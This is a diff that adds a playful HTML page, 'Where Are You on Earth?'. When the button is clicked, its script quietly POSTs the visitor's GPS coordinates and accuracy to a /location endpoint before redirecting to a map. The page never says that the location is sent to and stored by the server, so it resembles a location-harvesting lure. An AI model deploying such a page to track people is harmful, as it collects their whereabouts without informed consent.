@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Where Are You on Earth?</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: linear-gradient(to right, #00b4db, #0083b0);
+      color: white;
+      text-align: center;
+      padding: 50px;
+    }
+    h1 {
+      font-size: 3em;
+      margin-bottom: 0.5em;
+    }
+    p {
+      font-size: 1.2em;
+      margin-bottom: 2em;
+    }
+    button {
+      padding: 1em 2em;
+      font-size: 1.2em;
+      background: #fff;
+      color: #0083b0;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      box-shadow: 0 4px 8px rgba(0,0,0,0.3);
+    }
+  </style>
+</head>
+<body>
+  <h1>🌍 Where Are You on Earth?</h1>
+  <p>Click below to find your live location!</p>
+  <button onclick="getLocation()">Find Out Now</button>
+
+  <script>
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+          fetch('/location', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              lat: position.coords.latitude,
+              lon: position.coords.longitude,
+              accuracy: position.coords.accuracy,
+              timestamp: Date.now()
+            })
+          }).finally(() => {
+            // ✅ Redirect after sending location
+            window.location.href = "/map";
+          });
+        }, function(error) {
+          alert("Location error: " + error.message);
+        });
+      } else {
+        alert("Geolocation not supported.");
+      }
+    }
+  </script>
+</body>
+</html>
